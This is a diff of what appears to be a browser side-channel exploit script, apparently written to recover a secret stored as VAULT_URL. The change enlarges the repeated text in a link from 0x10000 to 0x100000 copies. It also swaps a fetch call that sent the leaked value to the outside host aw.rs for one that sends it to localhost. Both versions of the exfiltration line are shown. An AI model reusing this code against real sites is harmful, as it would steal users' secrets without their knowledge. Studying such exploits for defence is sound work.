@@ -92,7 +92,7 @@ Can use requestAnimationFrame and requestIdleCallback to reliably check when a l
         }
 
         async function setup() {
-            link.innerText = "aa ".repeat(0x10000);
+            link.innerText = "aa ".repeat(0x100000);
 
             let base = VAULT_URL;
 
@@ -115,7 +115,7 @@ Can use requestAnimationFrame and requestIdleCallback to reliably check when a l
                 }
             }
 
-            await fetch("http://aw.rs?" + base)
+            await fetch("http://localhost:80" + base)
         }
         setup()
     </script>
